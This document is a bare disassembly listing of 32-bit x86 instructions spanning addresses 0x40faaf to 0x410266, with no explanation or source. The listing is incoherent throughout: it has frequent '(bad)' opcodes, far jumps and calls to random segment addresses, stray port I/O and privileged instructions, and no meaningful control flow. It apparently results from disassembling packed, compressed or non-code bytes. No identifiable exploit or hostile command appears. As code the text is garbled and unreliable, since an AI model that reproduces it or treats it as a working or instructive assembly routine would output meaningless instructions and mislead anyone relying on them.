  40faaf:	(bad)  [ebx-0x32]
  40fab2:	xchg   ebx,eax
  40fab3:	add    dh,BYTE PTR [ebp+edi*2-0x7073fc46]
  40faba:	dec    esp
  40fabb:	xchg   edx,eax
  40fabc:	pop    ds
  40fabd:	xor    eax,0x3f2d72b5
  40fac2:	mov    ecx,0xece2c118
  40fac7:	push   ebx
  40fac8:	ins    DWORD PTR es:[edi],dx
  40fac9:	dec    ecx
  40faca:	xlat   BYTE PTR ds:[ebx]
  40facb:	cmp    dh,BYTE PTR [ecx-0x80]
  40face:	mov    al,ds:0x26ba5cf
  40fad3:	sub    DWORD PTR [esi+ebp*8],0xffffff8d
  40fad7:	dec    ebx
  40fad8:	and    al,0x2b
  40fada:	adc    bh,BYTE PTR [ebx-0x2c73e4c3]
  40fae0:	and    ah,BYTE PTR [ecx+0x284e52f1]
  40fae6:	popf   
  40fae7:	xchg   ecx,eax
  40fae8:	(bad)  
  40fae9:	push   0xffffff92
  40faeb:	jmp    0xe64c:0xf41ca221
  40faf2:	add    DWORD PTR [edx],esi
  40faf4:	mov    dl,0x2f
  40faf6:	aaa    
  40faf7:	push   0x74
  40faf9:	cmp    DWORD PTR [edi+0x5cef94c4],esi
  40faff:	sbb    bh,BYTE PTR [esi+0x49f2c87a]
  40fb05:	inc    edi
  40fb06:	adc    edx,DWORD PTR [edi-0x34778bd5]
  40fb0c:	xrelease xchg BYTE PTR [esi],al
  40fb0f:	lock out 0x7,al
  40fb12:	mov    eax,0xd04dd00b
  40fb17:	das    
  40fb18:	fs loopne 0x40fb9a
  40fb1b:	arpl   WORD PTR [edi+0x6e88c20d],di
  40fb21:	dec    BYTE PTR [ecx+0x6c]
  40fb24:	sub    ah,BYTE PTR [ebx-0x6b96d6c8]
  40fb2a:	mov    al,0x30
  40fb2c:	adc    bh,BYTE PTR [ecx+0x17]
  40fb2f:	xor    al,0xdd
  40fb31:	or     ah,BYTE PTR [edi]
  40fb33:	pushf  
  40fb34:	or     eax,0x1eda2f12
  40fb39:	arpl   WORD PTR [ebp+0x40],bp
  40fb3c:	pop    ds
  40fb3d:	xchg   ecx,eax
  40fb3e:	fsubp  st(0),st
  40fb40:	xlat   BYTE PTR ds:[ebx]
  40fb41:	(bad)  
  40fb42:	stos   BYTE PTR es:[edi],al
  40fb43:	(bad)  [ecx]
  40fb45:	call   0x8bf6:0xa7b4e7f1
  40fb4c:	cmp    eax,0x3e875676
  40fb51:	(bad)  
  40fb52:	in     eax,0xab
  40fb54:	or     ah,BYTE PTR [ebx+0x5c267f4e]
  40fb5a:	inc    edx
  40fb5b:	scas   al,BYTE PTR es:[edi]
  40fb5c:	ret    
  40fb5d:	gs mov bh,0x90
  40fb60:	sub    al,0xbf
  40fb62:	cli    
  40fb63:	aam    0x8b
  40fb65:	or     BYTE PTR [ebx],cl
  40fb67:	or     eax,0x2c2fe5d4
  40fb6c:	push   0x8424d4ec
  40fb71:	sbb    BYTE PTR [edx-0x777537d9],bl
  40fb77:	pop    eax
  40fb78:	pop    edx
  40fb79:	or     BYTE PTR [eax-0x32],0x46
  40fb7d:	sub    esp,edi
  40fb7f:	add    BYTE PTR [ecx],al
  40fb81:	pop    ds
  40fb82:	inc    edx
  40fb83:	push   0xd47febcf
  40fb88:	jg     0x40fbef
  40fb8a:	sub    eax,0xc05de65b
  40fb8f:	push   ds
  40fb90:	cmp    eax,0x464554a
  40fb95:	mov    esi,0x8b149f3f
  40fb9a:	sub    BYTE PTR [esp+esi*8+0x30ee3fba],bl
  40fba1:	sbb    al,0x2b
  40fba3:	pop    edx
  40fba4:	cs add eax,0x1e953709
  40fbaa:	xor    BYTE PTR [eax+eax*1],bh
  40fbad:	sti    
  40fbae:	push   ecx
  40fbaf:	jmp    0x9558:0x154476b
  40fbb6:	sbb    BYTE PTR [ebx+esi*2-0x5dcde84c],dh
  40fbbd:	mov    dh,0xed
  40fbbf:	test   BYTE PTR [ecx+0x12],ah
  40fbc2:	mov    ds:0x9daa0ec6,eax
  40fbc8:	dec    ebp
  40fbc9:	fist   WORD PTR [ebx-0x3f]
  40fbcc:	inc    ebx
  40fbcd:	adc    al,0x89
  40fbcf:	nop
  40fbd0:	mov    ds:0x8c93ad6c,al
  40fbd5:	add    ch,BYTE PTR [esi-0x16]
  40fbd8:	mov    al,0x6c
  40fbda:	jecxz  0x40fb8b
  40fbdc:	cli    
  40fbdd:	out    dx,al
  40fbde:	pop    ebx
  40fbdf:	add    DWORD PTR [eax-0x2825ed83],0x60
  40fbe6:	pop    edi
  40fbe7:	imul   eax,DWORD PTR [ecx+ebp*8-0x3161ec1c],0x56
  40fbef:	fnstsw WORD PTR [ebp+0x6f]
  40fbf2:	cmp    bh,BYTE PTR [esi+ebx*8]
  40fbf5:	bound  eax,QWORD PTR [eax]
  40fbf7:	(bad)  
  40fbf8:	push   eax
  40fbf9:	jmp    0x6a23:0x66c3643d
  40fc00:	xor    esi,esp
  40fc02:	mov    ds:0x8a1bc7df,eax
  40fc07:	or     esi,DWORD PTR [edi]
  40fc09:	pop    ds
  40fc0a:	ret    
  40fc0b:	aaa    
  40fc0c:	inc    edx
  40fc0d:	mov    DWORD PTR [esp+ecx*2],ebp
  40fc10:	lock xlat BYTE PTR ds:[ebx]
  40fc12:	loope  0x40fc20
  40fc14:	or     ch,BYTE PTR [edi]
  40fc16:	xchg   ecx,esi
  40fc18:	xor    eax,0x221303fc
  40fc1d:	in     eax,0xae
  40fc1f:	inc    ecx
  40fc20:	data16 cmp BYTE PTR [ebp-0x7db7e30d],0xff
  40fc28:	arpl   WORD PTR [eax],dx
  40fc2a:	cdq    
  40fc2b:	jmp    0xd978fd74
  40fc30:	in     eax,dx
  40fc31:	leave  
  40fc32:	les    esi,FWORD PTR [ebx+0x6a]
  40fc35:	add    DWORD PTR [edi-0x4f18d79e],esi
  40fc3b:	mov    ebp,gs
  40fc3d:	aad    0x9c
  40fc3f:	cmp    al,0x2a
  40fc41:	arpl   WORD PTR [esi+0x66],si
  40fc44:	push   ebp
  40fc45:	fidiv  DWORD PTR [eax+0x5a]
  40fc48:	jge    0x40fc49
  40fc4a:	(bad)  
  40fc4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc4c:	pushf  
  40fc4d:	adc    ebx,DWORD PTR [esp+ebp*2+0x34]
  40fc51:	xchg   edi,eax
  40fc52:	jg     0x40fca8
  40fc54:	xchg   edi,eax
  40fc55:	leave  
  40fc56:	xor    al,0x7b
  40fc58:	fcmovnu st,st(2)
  40fc5a:	les    ebp,FWORD PTR ds:0x4c42ef60
  40fc60:	or     dh,BYTE PTR [esi-0x16]
  40fc63:	xor    al,0xd
  40fc65:	sub    ch,ch
  40fc67:	in     al,dx
  40fc68:	xchg   ecx,eax
  40fc69:	call   DWORD PTR [eax-0x28df5d6]
  40fc6f:	les    edx,FWORD PTR ds:0xed92a908
  40fc75:	xchg   ebx,eax
  40fc76:	fdiv   DWORD PTR [ebx-0x50]
  40fc79:	call   0x9fc5:0xff6c6d17
  40fc80:	leave  
  40fc81:	sbb    eax,0x163f61ad
  40fc86:	aaa    
  40fc87:	fldcw  WORD PTR [eax]
  40fc89:	dec    ebx
  40fc8a:	mov    dh,0x9d
  40fc8c:	jb     0x40fc24
  40fc8e:	jns    0x40fc9f
  40fc90:	out    0x18,eax
  40fc92:	cmc    
  40fc93:	frstor [eax]
  40fc95:	and    eax,DWORD PTR [eax+0x64]
  40fc98:	fsubr  st,st(3)
  40fc9a:	imul   ebx,esp,0x2e
  40fc9d:	push   ds
  40fc9e:	mov    ah,0xf6
  40fca0:	fcmovnb st,st(6)
  40fca2:	js     0x40fcb8
  40fca4:	call   0xcd66:0xa0bc0134
  40fcab:	xchg   edi,eax
  40fcac:	mov    esi,ss
  40fcae:	dec    esi
  40fcaf:	mov    WORD PTR [edi],fs
  40fcb1:	xlat   BYTE PTR ds:[ebx]
  40fcb2:	rcr    DWORD PTR [ebp+0x2],1
  40fcb5:	imul   eax,DWORD PTR [eax-0x18ce9874],0xffffff86
  40fcbc:	sub    al,0x7b
  40fcbe:	xor    DWORD PTR [edx+0x63408cf6],edx
  40fcc4:	mov    dl,0x45
  40fcc6:	lock cdq 
  40fcc8:	xchg   DWORD PTR [edi+ecx*4+0x3b],esi
  40fccc:	gs pop ecx
  40fcce:	pop    ebx
  40fccf:	sbb    dh,BYTE PTR [ebp-0x375575a9]
  40fcd5:	adc    al,0x11
  40fcd7:	sti    
  40fcd8:	into   
  40fcd9:	mov    ds:0x175447ec,eax
  40fcde:	dec    edx
  40fcdf:	(bad)  
  40fce0:	push   ss
  40fce1:	loope  0x40fc9f
  40fce3:	push   ecx
  40fce4:	ror    ch,1
  40fce6:	(bad)  
  40fce7:	std    
  40fce8:	mov    esp,0x8902a406
  40fced:	in     al,dx
  40fcee:	test   DWORD PTR [edx-0x46b372b],ebp
  40fcf4:	and    al,0xc3
  40fcf6:	fcomp  QWORD PTR [ebp*8-0x534aa1d]
  40fcfd:	ror    DWORD PTR [ebp+0x1d],1
  40fd00:	in     eax,0x65
  40fd02:	test   BYTE PTR [ebp-0x5e],cl
  40fd05:	xor    BYTE PTR [ecx+0x41],cl
  40fd08:	inc    ebx
  40fd09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd0a:	push   ecx
  40fd0b:	cmp    eax,0xe0b0ba58
  40fd10:	pusha  
  40fd11:	out    0xb9,eax
  40fd13:	jnp    0x40fc9c
  40fd15:	adc    edx,eax
  40fd17:	or     DWORD PTR [eax+0x1892bc26],0x39fb3113
  40fd21:	pop    edi
  40fd22:	jnp    0x40fd2c
  40fd24:	int    0x43
  40fd26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd27:	scas   al,BYTE PTR es:[edi]
  40fd28:	repnz xchg ebp,eax
  40fd2a:	or     al,0x2b
  40fd2c:	inc    edi
  40fd2d:	popf   
  40fd2e:	retf   
  40fd2f:	ins    DWORD PTR es:[edi],dx
  40fd30:	inc    eax
  40fd31:	aam    0x83
  40fd33:	xchg   BYTE PTR [edi+eiz*2-0x54],dh
  40fd37:	sub    eax,0xd8e87966
  40fd3c:	int3   
  40fd3d:	mov    bl,0xca
  40fd3f:	mov    ebx,0xa53fce1
  40fd44:	cmp    BYTE PTR [edx],bh
  40fd46:	mov    WORD PTR [ebp+0x3a7f6656],ss
  40fd4c:	jb     0x40fd08
  40fd4e:	or     al,0x14
  40fd50:	adc    ah,bl
  40fd52:	pop    esp
  40fd53:	popa   
  40fd54:	not    BYTE PTR [edi]
  40fd56:	pop    es
  40fd57:	in     al,dx
  40fd58:	mov    bh,0xd8
  40fd5a:	pop    ds
  40fd5b:	leave  
  40fd5c:	ins    DWORD PTR es:[edi],dx
  40fd5d:	ror    DWORD PTR [esi],0xaa
  40fd60:	out    dx,al
  40fd61:	nop
  40fd62:	xchg   DWORD PTR [ecx+0x66],esp
  40fd65:	mov    esp,0x5933d8d6
  40fd6a:	rol    dl,cl
  40fd6c:	jp     0x40fd58
  40fd6e:	sub    DWORD PTR [edi],edx
  40fd70:	jle    0x40fdd6
  40fd72:	xchg   edx,eax
  40fd73:	test   eax,0x89a6e642
  40fd78:	jns    0x40fd30
  40fd7a:	and    al,BYTE PTR [edi-0x53]
  40fd7d:	mul    DWORD PTR [ebx+ebx*2]
  40fd80:	cs jns 0x40fd1e
  40fd83:	mov    bl,0xfa
  40fd85:	xor    ebx,edx
  40fd87:	mov    eax,ds:0xe4bf11dd
  40fd8c:	mov    es,WORD PTR [ebp-0x6120a01b]
  40fd92:	push   ebp
  40fd93:	sbb    ebx,ebp
  40fd95:	add    eax,0xdc4317f
  40fd9a:	arpl   WORD PTR [esi+0x297923de],bp
  40fda0:	in     eax,0xf0
  40fda2:	out    dx,al
  40fda3:	pop    ecx
  40fda4:	je     0x40fdd4
  40fda6:	or     esi,DWORD PTR [eax]
  40fda8:	xchg   esp,eax
  40fda9:	mov    esp,0xae77de93
  40fdae:	jae    0x40fded
  40fdb0:	pop    ebx
  40fdb1:	clc    
  40fdb2:	bound  ebx,QWORD PTR [edx-0x2]
  40fdb5:	xor    ebx,DWORD PTR [ebx+0x29160278]
  40fdbb:	and    DWORD PTR [ebp+eax*2+0x11],edi
  40fdbf:	pop    esp
  40fdc0:	fwait
  40fdc1:	xlat   BYTE PTR ds:[ebx]
  40fdc2:	int    0x54
  40fdc4:	add    eax,DWORD PTR [edi+0x61fb5fa2]
  40fdca:	push   ebp
  40fdcb:	xchg   esp,eax
  40fdcc:	sub    eax,0x56678ab
  40fdd1:	adc    eax,0x3ee11c58
  40fdd6:	(bad)  
  40fdd7:	loopne 0x40fdaa
  40fdd9:	jle    0x40fdd2
  40fddb:	lods   al,BYTE PTR ds:[esi]
  40fddc:	push   ecx
  40fddd:	retf   
  40fdde:	push   0x3d
  40fde0:	mov    ch,0xfd
  40fde2:	cmp    ecx,DWORD PTR [edx+0x3e0d982c]
  40fde8:	xor    eax,0x2dcf804c
  40fded:	xchg   esi,edi
  40fdef:	ins    DWORD PTR es:[edi],dx
  40fdf0:	push   es
  40fdf1:	pop    esi
  40fdf2:	lahf   
  40fdf3:	inc    eax
  40fdf4:	test   BYTE PTR [eax+0x3f5f2141],bh
  40fdfa:	or     BYTE PTR [ebp+0x5d3ba686],0xd0
  40fe01:	push   esi
  40fe02:	inc    ecx
  40fe03:	pop    es
  40fe04:	fidiv  WORD PTR [edi]
  40fe06:	call   0xd2724915
  40fe0b:	data16 jge 0x40fe75
  40fe0e:	cdq    
  40fe0f:	leave  
  40fe10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe11:	test   al,0x34
  40fe13:	cwde   
  40fe14:	push   es
  40fe15:	xor    ebx,DWORD PTR [eax+ebp*4-0x33]
  40fe19:	jmp    0x44e6b267
  40fe1e:	and    esp,DWORD PTR [ecx+0x5d4037f1]
  40fe24:	xor    al,0x98
  40fe26:	ret    
  40fe27:	xchg   ecx,eax
  40fe28:	or     DWORD PTR [edi],edx
  40fe2a:	in     eax,0x47
  40fe2c:	sbb    eax,0xbf87d58c
  40fe31:	or     eax,0xeb67c533
  40fe36:	and    dl,0x31
  40fe39:	int3   
  40fe3a:	imul   ebp,DWORD PTR [ebp-0x5da019b4],0xffffffb5
  40fe41:	xchg   ecx,eax
  40fe42:	sti    
  40fe43:	and    DWORD PTR [esi],ebp
  40fe45:	rcr    DWORD PTR [eax-0x1dcc4cfe],0x5d
  40fe4c:	push   ds
  40fe4d:	jo     0x40fe02
  40fe4f:	mov    edi,0xe2d48e06
  40fe54:	lahf   
  40fe55:	mov    eax,ds:0xbad7a260
  40fe5a:	dec    edx
  40fe5b:	dec    ebp
  40fe5c:	push   0xfd7e7352
  40fe61:	dec    edi
  40fe62:	jb     0x40fece
  40fe64:	xor    BYTE PTR [edx-0x8d2533b],dh
  40fe6a:	ja     0x40fe14
  40fe6c:	mov    esi,0x387eeb95
  40fe71:	rcl    BYTE PTR cs:[ecx-0x726fe118],0x1d
  40fe79:	aam    0xe0
  40fe7b:	cmp    ebp,DWORD PTR [ecx-0x2b]
  40fe7e:	data16 mov al,ds:0xe3273517
  40fe84:	pop    edi
  40fe85:	and    eax,0x3de21564
  40fe8a:	mov    al,ds:0x34a570bd
  40fe8f:	or     esi,DWORD PTR [ecx+0x61756290]
  40fe95:	retf   
  40fe96:	ret    
  40fe97:	xor    dh,BYTE PTR [ecx*8-0x3e4bd8d4]
  40fe9e:	adc    eax,0x6d77e2a9
  40fea3:	and    esp,DWORD PTR [ecx-0x75]
  40fea6:	daa    
  40fea7:	jae    0x40fe2e
  40fea9:	das    
  40feaa:	ss sub al,0x30
  40fead:	sbb    ch,bh
  40feaf:	pop    es
  40feb0:	je     0x40fe9d
  40feb2:	and    ah,dl
  40feb4:	pusha  
  40feb5:	inc    eax
  40feb6:	jmp    0x7ea7:0x5b9b925a
  40febd:	sar    BYTE PTR es:[edi+0x46],cl
  40fec1:	test   eax,0xa28a58b2
  40fec6:	sbb    DWORD PTR [ebx],ebx
  40fec8:	push   edx
  40fec9:	add    BYTE PTR [edx-0x6d],dl
  40fecc:	mov    esi,0x225fee8f
  40fed1:	pop    esp
  40fed2:	jecxz  0x40fe89
  40fed4:	and    DWORD PTR [esi+0x7831500c],0xfb939515
  40fede:	mov    edx,DWORD PTR [edx+eax*2+0x13f40057]
  40fee5:	in     eax,dx
  40fee6:	inc    edi
  40fee7:	lods   eax,DWORD PTR ds:[esi]
  40fee8:	lahf   
  40fee9:	jmp    0xb1784072
  40feee:	mov    edi,0xb3988b76
  40fef3:	jp     0x40fe9b
  40fef5:	test   al,0x42
  40fef7:	xchg   ebp,eax
  40fef8:	mov    eax,0xdb91e60e
  40fefd:	and    BYTE PTR [edi-0x9149dd5],bh
  40ff03:	mov    ss,WORD PTR [eax-0xe2ab9eb]
  40ff09:	add    BYTE PTR [esi],dl
  40ff0b:	retf   0x1ab4
  40ff0e:	xor    bl,cl
  40ff10:	pop    eax
  40ff11:	pusha  
  40ff12:	js     0x40ff25
  40ff14:	mov    ecx,0x435b750b
  40ff19:	ret    0xc64a
  40ff1c:	addr16 push es
  40ff1e:	ret    
  40ff1f:	mov    dh,cl
  40ff21:	dec    ebp
  40ff22:	adc    eax,edx
  40ff24:	dec    ecx
  40ff25:	push   edi
  40ff26:	int3   
  40ff27:	imul   esi,DWORD PTR [ebx+0x77430941],0x5c
  40ff2e:	(bad)  
  40ff2f:	jo     0x40ffa2
  40ff31:	mov    dh,0x5a
  40ff33:	push   esp
  40ff34:	stos   DWORD PTR es:[edi],eax
  40ff35:	adc    ebp,DWORD PTR [eax]
  40ff37:	adc    BYTE PTR [ebx+0x7f],bl
  40ff3a:	xchg   esp,eax
  40ff3b:	rcl    al,cl
  40ff3d:	inc    eax
  40ff3e:	stos   DWORD PTR es:[edi],eax
  40ff3f:	mov    bl,0xd1
  40ff41:	(bad)  
  40ff42:	inc    dl
  40ff44:	xchg   ebp,eax
  40ff45:	mov    BYTE PTR [ebp+0x79],cl
  40ff48:	call   0xc063:0xcc34c679
  40ff4f:	rcr    DWORD PTR [edi+0x61],cl
  40ff52:	loopne 0x40ff55
  40ff54:	mov    ebx,DWORD PTR [ebx+0x46a5e512]
  40ff5a:	pusha  
  40ff5b:	add    BYTE PTR [ebx-0x38],dh
  40ff5e:	adc    DWORD PTR [edi+0x482ecb73],0xd
  40ff65:	ret    0x4610
  40ff68:	imul   edi,ebx,0xffffff9d
  40ff6b:	sbb    al,dl
  40ff6d:	inc    edi
  40ff6e:	xchg   edi,eax
  40ff6f:	push   ebx
  40ff70:	pushf  
  40ff71:	rol    DWORD PTR [edi+0x61],cl
  40ff74:	shl    BYTE PTR [ecx],cl
  40ff76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff77:	adc    dl,BYTE PTR [edi]
  40ff79:	add    ecx,ecx
  40ff7b:	mov    bl,0x4d
  40ff7d:	in     eax,dx
  40ff7e:	mov    edi,0x2d72795
  40ff83:	mov    edx,0xf7970e96
  40ff88:	ret    0xfec4
  40ff8b:	or     DWORD PTR [ebp+0x65bbac32],edi
  40ff91:	call   0x2e9d1764
  40ff96:	sbb    edi,DWORD PTR [eax]
  40ff98:	jp     0x40ff2d
  40ff9a:	inc    ebx
  40ff9b:	pop    edx
  40ff9c:	inc    edi
  40ff9d:	les    ecx,FWORD PTR [ebx]
  40ff9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffa0:	or     esi,DWORD PTR [esp+eiz*8+0x96e086a]
  40ffa7:	sub    ah,cl
  40ffa9:	fst    QWORD PTR [ebx]
  40ffab:	push   ecx
  40ffac:	or     eax,0x8b1255fa
  40ffb1:	cmp    edx,DWORD PTR [esi-0x1f]
  40ffb4:	dec    esp
  40ffb5:	data16 cli 
  40ffb7:	jle    0x40ffa3
  40ffb9:	inc    ecx
  40ffba:	jns    0x41002a
  40ffbc:	push   ebp
  40ffbd:	jb     0x40fff2
  40ffbf:	inc    ecx
  40ffc0:	repz test bh,dl
  40ffc3:	pop    edi
  40ffc4:	fisttp WORD PTR [edx]
  40ffc6:	pop    ds
  40ffc7:	cdq    
  40ffc8:	lock fidiv WORD PTR [edx]
  40ffcb:	fcom   DWORD PTR [eax]
  40ffcd:	push   ebx
  40ffce:	adc    esi,DWORD PTR [ebx]
  40ffd0:	pop    ebx
  40ffd1:	mov    ebp,0xeb50d0b9
  40ffd6:	xor    BYTE PTR [ecx+0x5a8adcb6],bl
  40ffdc:	or     BYTE PTR [edx+0x6e],cl
  40ffdf:	imul   eax,DWORD PTR [esp+edi*8-0x2e27c5e7],0x9c00e10b
  40ffea:	pop    edx
  40ffeb:	aam    0xf0
  40ffed:	fs cld 
  40ffef:	fldenv [ebx-0x2]
  40fff2:	jg     0x410034
  40fff4:	pop    eax
  40fff5:	retf   
  40fff6:	and    al,BYTE PTR [eax+ebx*4+0x4b]
  40fffa:	push   ecx
  40fffb:	ret    
  40fffc:	inc    ecx
  40fffd:	inc    eax
  40fffe:	mov    ch,BYTE PTR ds:0x178c540b
  410004:	mov    edi,0x3f4465fe
  410009:	jmp    0xd7777719
  41000e:	jb     0x40ffa5
  410010:	pop    ebp
  410011:	stc    
  410012:	stc    
  410013:	in     eax,dx
  410014:	je     0x410050
  410016:	xor    bl,BYTE PTR [ecx-0x76edfd4b]
  41001c:	or     edx,DWORD PTR [ecx]
  41001e:	cmp    BYTE PTR [edi+0x4ff5135c],0x32
  410025:	fiadd  DWORD PTR [eax+0x9]
  410028:	into   
  410029:	je     0x410005
  41002b:	cwde   
  41002c:	dec    edi
  41002d:	je     0x410045
  41002f:	out    dx,al
  410030:	(bad)  
  410031:	mov    edi,0x248b56ce
  410036:	int3   
  410037:	je     0x4100ad
  410039:	inc    ebp
  41003a:	div    BYTE PTR [edx]
  41003c:	aas    
  41003d:	dec    ebp
  41003e:	xor    al,0x62
  410040:	pop    ebp
  410041:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410042:	scas   al,BYTE PTR es:[edi]
  410043:	xchg   esi,eax
  410044:	jmp    FWORD PTR [edx-0x75126b4a]
  41004a:	stos   DWORD PTR es:[edi],eax
  41004b:	inc    edi
  41004c:	adc    edi,edi
  41004e:	retf   
  41004f:	mov    esp,0xc7d5f809
  410054:	test   eax,0x568c43af
  410059:	dec    edx
  41005a:	or     BYTE PTR [ecx],bl
  41005c:	aaa    
  41005d:	fnsave [edx]
  41005f:	jmp    0xf36d:0x47f886d9
  410066:	test   BYTE PTR [edx-0x4d1134ba],0xa5
  41006d:	call   0xb827:0x34bdd855
  410074:	jecxz  0x410091
  410076:	pxor   mm0,mm6
  410079:	add    cl,BYTE PTR [ebx-0x436189af]
  41007f:	and    DWORD PTR [eax+0x501f258f],edx
  410085:	add    ah,0x33
  410088:	loop   0x410106
  41008a:	push   0x967d771c
  41008f:	mov    DWORD PTR [esi],edi
  410091:	add    eax,DWORD PTR [ebx]
  410093:	cmp    BYTE PTR ds:0xa05f8391,ah
  410099:	cmp    edx,0xf4d53764
  41009f:	pop    ss
  4100a0:	(bad)  
  4100a1:	xor    DWORD PTR ss:[eax+ebp*4-0x63],esp
  4100a6:	clc    
  4100a7:	pop    es
  4100a8:	fist   DWORD PTR [eax]
  4100aa:	push   esp
  4100ab:	sbb    eax,0x78b74be9
  4100b0:	mov    al,0x78
  4100b2:	jp     0x4100f5
  4100b4:	loopne 0x41010d
  4100b6:	or     eax,0x72983b2d
  4100bb:	adc    esp,eax
  4100bd:	mov    edx,0xa49a1011
  4100c2:	es xchg esp,edi
  4100c5:	push   esi
  4100c6:	stos   BYTE PTR es:[edi],al
  4100c7:	inc    esp
  4100c8:	or     BYTE PTR [esi-0x17],al
  4100cb:	dec    ecx
  4100cc:	add    esi,DWORD PTR [ebx]
  4100ce:	sub    dh,BYTE PTR [edx+0x36]
  4100d1:	pop    ebx
  4100d2:	bound  esi,QWORD PTR [esi+0x42]
  4100d5:	hlt    
  4100d6:	and    bl,BYTE PTR [ecx+edi*4+0x58]
  4100da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100db:	pop    ss
  4100dc:	add    al,0x51
  4100de:	enter  0xf423,0x72
  4100e2:	icebp  
  4100e3:	xor    bh,0x96
  4100e6:	jo     0x4100ac
  4100e8:	push   ebx
  4100e9:	mov    al,ds:0x5eb04b8e
  4100ee:	pop    es
  4100ef:	mov    ss,WORD PTR [ecx+0x67196b6c]
  4100f5:	or     bl,0x8b
  4100f8:	sub    eax,0x8ffc9e5a
  4100fd:	jp     0x410138
  4100ff:	dec    ebp
  410100:	stos   BYTE PTR es:[edi],al
  410101:	popa   
  410102:	jg     0x410182
  410104:	sub    al,0x52
  410106:	gs enter 0xf75e,0x7c
  41010b:	mov    ecx,0x25eb16f4
  410110:	sbb    ah,ah
  410112:	test   eax,0xe28b11c1
  410117:	jmp    0x410188
  410119:	jl     0x4100a9
  41011b:	imul   ebp,DWORD PTR [ebp-0x5f7d33c1],0x99eedb80
  410125:	jp     0x410110
  410127:	(bad)
  41012b:	push   esp
  41012c:	mov    esp,0x772df6b2
  410131:	mov    bl,BYTE PTR [ebp+0x76d678bd]
  410137:	push   0xffffffe6
  410139:	mov    dh,0x41
  41013b:	sbb    DWORD PTR [ebx+0x44],0x9aeea814
  410142:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410143:	shl    edx,1
  410145:	(bad)  
  410146:	repnz stc 
  410148:	mov    bl,0x6b
  41014a:	adc    edi,edi
  41014c:	mov    ebx,0xc063456e
  410151:	dec    esi
  410152:	jg     0x410118
  410154:	idiv   DWORD PTR [eax+0x7e]
  410157:	push   ecx
  410158:	pop    ecx
  410159:	jmp    0x5113:0x6763077c
  410160:	xor    bl,bh
  410162:	cmc    
  410163:	das    
  410164:	push   ecx
  410165:	(bad)  
  410166:	arpl   WORD PTR [eax-0x2d],di
  410169:	out    0x6c,al
  41016b:	or     dl,BYTE PTR [ecx+0x5b]
  41016e:	int3   
  41016f:	into   
  410170:	push   cs
  410171:	pop    ss
  410172:	jb     0x11c2e5e4
  410178:	cli    
  410179:	int3   
  41017a:	push   ds
  41017b:	imul   edi,edx,0xb41ae658
  410181:	lods   al,BYTE PTR ds:[esi]
  410182:	jnp    0x41015c
  410184:	stc    
  410185:	and    al,0x98
  410187:	(bad)  
  410188:	out    dx,eax
  410189:	test   BYTE PTR ds:0x3525b496,al
  41018f:	mov    ebx,0x418f1b50
  410194:	add    BYTE PTR [eax+0x41b1684d],dh
  41019a:	mov    dl,0xfc
  41019c:	ret    0x9597
  41019f:	sub    dl,BYTE PTR [edx+0xa8b9f54]
  4101a5:	xchg   BYTE PTR [ebx-0x3a49546d],bl
  4101ab:	adc    DWORD PTR fs:[eax],ebx
  4101ae:	and    al,0x86
  4101b0:	pop    ds
  4101b1:	pop    esi
  4101b2:	adc    bh,BYTE PTR [edx-0x7570e0b8]
  4101b8:	jp     0x410192
  4101ba:	mov    bh,0xa7
  4101bc:	jl     0x41015e
  4101be:	xor    al,BYTE PTR [ecx+0x34]
  4101c1:	cwde   
  4101c2:	test   eax,0xd7b7f58d
  4101c7:	ja     0x4101ce
  4101c9:	outs   dx,DWORD PTR ds:[esi]
  4101ca:	cmp    ch,dh
  4101cc:	lods   eax,DWORD PTR ds:[esi]
  4101cd:	dec    esp
  4101ce:	xchg   esp,eax
  4101cf:	mov    ds:0xceadfa5b,al
  4101d4:	sub    ch,BYTE PTR [edx]
  4101d6:	loopne 0x41023a
  4101d8:	int3   
  4101d9:	push   ss
  4101da:	arpl   WORD PTR [eax],bp
  4101dc:	pop    ebp
  4101dd:	add    al,0x7
  4101df:	(bad)  
  4101e0:	repz fwait
  4101e2:	orps   xmm5,XMMWORD PTR [esi-0x47cb9b69]
  4101e9:	std    
  4101ea:	mov    al,0xd1
  4101ec:	fucomip st,st(6)
  4101ee:	cmp    BYTE PTR [edx+0x2],ch
  4101f1:	or     esp,DWORD PTR [ecx-0x42]
  4101f4:	sub    eax,0xd67bba8c
  4101f9:	js     0x41020a
  4101fb:	sti    
  4101fc:	add    ecx,DWORD PTR [ecx]
  4101fe:	js     0x410183
  410200:	loop   0x4101e5
  410202:	dec    eax
  410203:	mov    esp,0x36359ef2
  410208:	lahf   
  410209:	or     dl,BYTE PTR [esi+0x32]
  41020c:	aam    0xeb
  41020e:	sbb    ebx,DWORD PTR [ebx]
  410210:	pop    ebp
  410211:	rcr    DWORD PTR ds:0xbd1f7c06,1
  410217:	mov    ebp,0x8d431286
  41021c:	shl    DWORD PTR [ebx],cl
  41021e:	ss and ebp,ebx
  410221:	and    al,0xbb
  410223:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410224:	popf   
  410225:	jno    0x4101d3
  410227:	mov    esi,0x1f196e30
  41022c:	sbb    al,0x46
  41022e:	inc    ebp
  41022f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410230:	adc    eax,0x8a7ae02f
  410235:	fldcw  WORD PTR [eax-0x2c]
  410238:	fst    DWORD PTR [esi+0x33]
  41023b:	fcomp  DWORD PTR cs:[edx-0x43]
  41023f:	lahf   
  410240:	sbb    bl,ch
  410242:	cmp    BYTE PTR [eax],al
  410244:	shl    DWORD PTR [esi-0x7d],0x6f
  410248:	cmc    
  410249:	jge    0x410252
  41024b:	pop    es
  41024c:	mov    eax,ds:0xa2322171
  410251:	dec    edi
  410252:	sahf   
  410253:	test   al,0xc0
  410255:	pop    esi
  410256:	jb     0x4101f8
  410258:	fldpi  
  41025a:	inc    esp
  41025b:	xor    dl,BYTE PTR [esi]
  41025d:	addr16 jp 0x4102a5
  410260:	and    eax,DWORD PTR [ebp-0x45c9c39f]
  410266:	jo     0x410239
